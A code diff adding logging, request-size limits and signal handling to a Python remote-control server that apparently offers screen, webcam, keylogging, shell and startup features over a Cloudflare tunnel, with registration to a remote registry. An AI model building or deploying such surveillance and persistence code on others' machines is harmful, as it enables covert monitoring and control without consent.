@@ -7,7 +7,9 @@ import os
 import sys
 import json
 import time
+import base64
 import signal
+import logging
 import platform
 import threading
 from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
@@ -22,6 +24,13 @@ from features import screen, webcam, shell, files, system, audio, keylog, startu
 
 PORT = 5000
 VERSION = config.get_version()
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S",
+)
+log = logging.getLogger("syscontrol")
 
 # ── Embedded HTML page ──────────────────────────────────────────────
 
@@ -86,25 +95,31 @@ def require_auth(handler):
 def start_tunnel_and_registry():
     cfg = config.get_config()
     if not cfg:
+        log.warning("No config found, skipping tunnel")
         return
+    log.info("Starting Cloudflare tunnel on port %d...", PORT)
     url = tunnel.start(PORT)
     if url:
+        log.info("Tunnel active: %s", url)
         pw = cfg.get("password_plain", "")
         registry.register_url(
             cfg["device_id"], cfg["device_name"], url, pw, VERSION,
         )
+        log.info("Registered with GAS registry")
         registry.heartbeat_loop(
             cfg["device_id"], cfg["device_name"],
             tunnel.get_url, pw, VERSION,
         )
+    else:
+        log.warning("Tunnel failed to start (cloudflared missing or errored)")
 
 
 # ── HTTP Handler ─────────────────────────────────────────────────────
 
 class Handler(BaseHTTPRequestHandler):
 
-    def log_message(self, *a):
-        pass  # silent
+    def log_message(self, fmt, *args):
+        log.debug("%s %s", self.client_address[0], fmt % args)
 
     def _cors(self):
         self.send_header("Access-Control-Allow-Origin", "*")
@@ -126,10 +141,14 @@ class Handler(BaseHTTPRequestHandler):
         s, ct, body = json_bytes(obj, status)
         self._send(s, ct, body)
 
+    MAX_BODY = 20 * 1024 * 1024  # 20 MB
+
     def _read_body(self):
         length = int(self.headers.get("Content-Length", 0))
         if length == 0:
             return {}
+        if length > self.MAX_BODY:
+            raise ValueError("Request body too large")
         return json.loads(self.rfile.read(length))
 
     def _auth_or_deny(self):
@@ -233,7 +252,11 @@ class Handler(BaseHTTPRequestHandler):
 
         # ── Public: login ──
         if path == "/api/login":
-            body = self._read_body()
+            try:
+                body = self._read_body()
+            except (ValueError, json.JSONDecodeError):
+                self._json({"ok": False, "error": "Invalid request body"}, 400)
+                return
             pw = body.get("password", "")
             if config.verify_password(pw):
                 token = auth.create_token(config.get_device_id())
@@ -248,7 +271,11 @@ class Handler(BaseHTTPRequestHandler):
             return
 
         if path == "/api/cmd":
-            body = self._read_body()
+            try:
+                body = self._read_body()
+            except (ValueError, json.JSONDecodeError):
+                self._json({"ok": False, "error": "Invalid request body"}, 400)
+                return
             cmd = body.get("cmd", "").strip()
             self._handle_cmd(cmd)
             return
@@ -337,14 +364,12 @@ class Handler(BaseHTTPRequestHandler):
 
         if cmd == "/screen":
             data = screen.screenshot_jpeg()
-            import base64
             self._json({"type": "photo", "data": "data:image/jpeg;base64," + base64.b64encode(data).decode()})
             return
 
         if cmd == "/webcam":
             data = webcam.capture_jpeg()
             if data:
-                import base64
                 self._json({"type": "photo", "data": "data:image/jpeg;base64," + base64.b64encode(data).decode()})
             else:
                 self._json({"type": "text", "text": "Webcam unavailable — no camera detected"})
@@ -524,14 +549,14 @@ def kill_port_holder(port):
 
 
 def main():
-    # Auto-start registration first — even if server fails, next boot will retry
     startup.auto_setup()
 
-    # Zero-config: auto-setup if not configured
     if not config.is_configured():
         config.auto_setup()
+        log.info("First run — auto-configured with hostname: %s", platform.node())
     elif not config.get_password():
         config.reset_password()
+        log.info("Password was missing — regenerated")
 
     for attempt in range(3):
         try:
@@ -539,30 +564,37 @@ def main():
             break
         except OSError:
             if attempt < 2:
+                log.warning("Port %d busy, killing holder (attempt %d)", PORT, attempt + 1)
                 kill_port_holder(PORT)
             else:
                 raise
 
     server_thread = threading.Thread(target=server.serve_forever, daemon=True)
     server_thread.start()
+    log.info("Server listening on 0.0.0.0:%d", PORT)
 
     auth.init_secret()
     threading.Thread(target=start_tunnel_and_registry, daemon=True).start()
     updater.auto_update_loop()
 
-    try:
-        signal.pause()
-    except AttributeError:
-        try:
-            while True:
-                time.sleep(3600)
-        except KeyboardInterrupt:
-            pass
-    finally:
-        tunnel.stop()
-        cfg = config.get_config()
-        if cfg:
-            registry.set_offline(cfg["device_id"])
+    shutdown_event = threading.Event()
+
+    def _signal_handler(sig, frame):
+        log.info("Received signal %s, shutting down...", sig)
+        shutdown_event.set()
+
+    signal.signal(signal.SIGINT, _signal_handler)
+    signal.signal(signal.SIGTERM, _signal_handler)
+
+    shutdown_event.wait()
+
+    log.info("Cleaning up...")
+    server.shutdown()
+    tunnel.stop()
+    cfg = config.get_config()
+    if cfg:
+        registry.set_offline(cfg["device_id"])
+    log.info("Shutdown complete")
 
 
 def safe_main():
@@ -576,6 +608,7 @@ def safe_main():
         except KeyboardInterrupt:
             break
         except Exception:
+            log.exception("main() crashed, restarting in 10s...")
             time.sleep(10)
 
 
